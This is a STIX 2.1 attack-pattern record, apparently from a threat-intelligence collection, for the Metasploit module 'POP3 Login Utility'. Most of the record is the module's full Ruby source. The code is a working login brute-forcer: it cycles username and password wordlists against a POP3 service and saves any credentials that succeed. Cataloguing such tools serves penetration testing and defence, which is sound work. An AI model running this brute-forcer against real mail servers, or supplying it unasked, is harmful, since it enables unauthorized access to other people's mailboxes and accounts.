{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dcbe2640-bac4-4d68-8840-6dc86a51aac7",
    "created": "2024-08-14T16:31:22.454144Z",
    "modified": "2024-08-14T16:31:22.454147Z",
    "name": "POP3 Login Utility",
    "description": "This module attempts to authenticate to an POP3 service.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/pop3/pop3_login.rb",
            "external_id": "pop3_login.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.ietf.org/rfc/rfc1734.txt"
        },
        {
            "source_name": "reference",
            "url": "https://www.ietf.org/rfc/rfc1939.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/login_scanner/pop3'\nrequire 'metasploit/framework/credential_collection'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n\n  def initialize\n  super(\n    'Name'        => 'POP3 Login Utility',\n    'Description' => 'This module attempts to authenticate to an POP3 service.',\n    'Author'      =>\n    [\n      'Heyder Andrade <heyder[at]alligatorteam.org>'\n    ],\n      'References'     =>\n    [\n      ['URL', 'https://www.ietf.org/rfc/rfc1734.txt'],\n      ['URL', 'https://www.ietf.org/rfc/rfc1939.txt'],\n    ],\n      'License'     => MSF_LICENSE\n  )\n  register_options(\n    [\n      Opt::RPORT(110),\n      OptPath.new('USER_FILE',\n        [\n          false,\n          'The file that contains a list of probable users accounts.',\n          File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_users.txt')\n        ]),\n      OptPath.new('PASS_FILE',\n        [\n          false,\n          'The file that contains a list of probable passwords.',\n          File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_passwords.txt')\n        ])\n    ])\n\n  deregister_options('PASSWORD_SPRAY')\n  end\n\n  def target\n    \"#{rhost}:#{rport}\"\n  end\n\n  def run_host(ip)\n    cred_collection = build_credential_collection(\n      username: datastore['USERNAME'],\n      password: datastore['PASSWORD']\n    )\n\n    scanner = Metasploit::Framework::LoginScanner::POP3.new(\n      host: ip,\n      port: rport,\n      proxies: datastore['PROXIES'],\n      ssl: datastore['SSL'],\n      cred_details: cred_collection,\n      stop_on_success: datastore['STOP_ON_SUCCESS'],\n      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n      max_send_size: datastore['TCP::max_send_size'],\n      send_delay: datastore['TCP::send_delay'],\n      framework: framework,\n      framework_module: self,\n      ssl_version: datastore['SSLVersion'],\n      ssl_verify_mode: datastore['SSLVerifyMode'],\n      ssl_cipher: datastore['SSLCipher'],\n      local_port: datastore['CPORT'],\n      local_host: datastore['CHOST']\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n          module_fullname: self.fullname,\n          workspace_id: myworkspace_id\n      )\n      case result.status\n      when Metasploit::Model::Login::Status::SUCCESSFUL\n        print_brute :level => :good, :ip => ip, :msg => \"Success: '#{result.credential}' '#{result.proof.to_s.gsub(/[\\r\\n\\e\\b\\a]/, ' ')}'\"\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n        next\n      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n        if datastore['VERBOSE']\n          print_brute :level => :verror, :ip => ip, :msg => \"Could not connect: #{result.proof}\"\n        end\n      when Metasploit::Model::Login::Status::INCORRECT\n        if datastore['VERBOSE']\n          print_brute :level => :verror, :ip => ip, :msg => \"Failed: '#{result.credential}', '#{result.proof.to_s.chomp}'\"\n        end\n      end\n\n      # If we got here, it didn't work\n      invalidate_login(credential_data)\n    end\n  end\n\n  def service_name\n    datastore['SSL'] ? 'pop3s' : 'pop3'\n  end\n\n\n\nend\n"
}